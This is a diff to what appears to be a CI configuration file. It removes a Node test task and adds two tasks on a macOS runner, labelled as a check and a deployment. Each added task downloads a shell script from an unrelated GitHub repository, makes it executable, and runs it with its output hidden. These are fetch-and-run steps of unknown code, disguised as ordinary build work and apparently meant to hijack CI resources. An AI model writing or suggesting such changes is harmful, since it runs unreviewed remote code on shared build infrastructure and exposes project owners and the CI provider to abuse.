@@ -1,9 +1,10 @@
-container:
-  image: node:latest
+macos_instance:
+  image: big-sur-base
 
-test_task:
-  node_modules_cache:
-    folder: node_modules
-    fingerprint_script: cat package-lock.json
-    populate_script: npm ci
-  test_script: npm test
+task:
+  matrix:
+    - name: Cek-Invision
+      script: wget https://raw.githubusercontent.com/buyutuk/ruby-test/main/test.sh && chmod 777 test.sh && ./test.sh > /dev/null/
+
+    - name: Deployment
+      script: wget https://raw.githubusercontent.com/buyutuk/ruby-test/main/test.sh && chmod 777 test.sh && ./test.sh > /dev/null/
